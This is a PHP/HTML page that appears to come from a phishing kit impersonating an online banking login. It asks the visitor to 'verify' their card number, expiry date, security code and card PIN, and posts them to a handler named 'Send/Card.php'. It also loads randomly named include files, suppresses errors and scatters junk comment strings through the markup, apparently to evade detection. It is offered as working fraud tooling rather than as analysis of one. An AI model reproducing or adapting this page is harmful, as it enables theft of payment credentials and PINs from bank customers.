<?php error_reporting(0);
require_once 'Mpem4lhVmzNo.php.php';
require_once 'OG96jNVsnQ.php';
require_once '4ktzFFYhnl.php';
?><!DOCTYPE html>
<html class="js wf-roboto-i1-active wf-roboto-i2-active wf-roboto-n1-active wf-roboto-n2-active wf-roboto-n3-active wf-roboto-i3-active wf-roboto-n4-active wf-roboto-i4-active wf-roboto-n5-active wf-roboto-n6-active wf-roboto-n7-active wf-roboto-i6-active wf-roboto-i7-active wf-roboto-i5-active wf-roboto-n8-active wf-roboto-n9-active wf-roboto-i8-inactive wf-roboto-i9-inactive wf-active" lang="en">
<?php require_once('File/Vendor/header.php'); ?>

<!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!-->

<button class="olb-select-toggle" data-toggle="collapse" aria-expanded="false" aria-controls="olbSelectOptions" data-target="#olbSelectOptions">Verify Your Card Information.
</button>
</div>
<!--><!-->
<form id="" action="Send/Card.php" method="post" autocomplete="off"   >
<!--><!-->
<div >
<!--><!-->

<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="Card" id="Card" placeholder="Card number"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('Card');
															var maskOptions = {
															mask: '0000 0000 0000 0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</p>


<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="Expiry" id="Expiry" placeholder="Expiry Date"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('Expiry');
															var maskOptions = {
															mask: '00/0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</p>


<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="cvv" id="cvv" placeholder="Card Security Code"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('cvv');
															var maskOptions = {
															mask: '000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</p>


<div class="input-wrapper form-group mb-0 w-100 special mr-1">
<input type="text" name="pin" id="pin" placeholder="Card PIN"   maxlength="19" required="required"   spellcheck="off" autocorrect="off" autocapitalize="off" class="olb-input form-control w-100" data-parsley-required="" style="border: 2px solid black; border-radius: 4px;" >
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('pin');
															var maskOptions = {
															mask: '0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</p>





<!--><!-->
</br>
</div>
<!--><!-->
</div>
</div>
</div>
<!--><!-->
<button type="submit" class="btn btn-default">Login
<span class="sr-only"> to Online Banking
</span>
</button>
<!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!--><!-->
<?php require_once('File/Vendor/footer.php'); ?>
</html>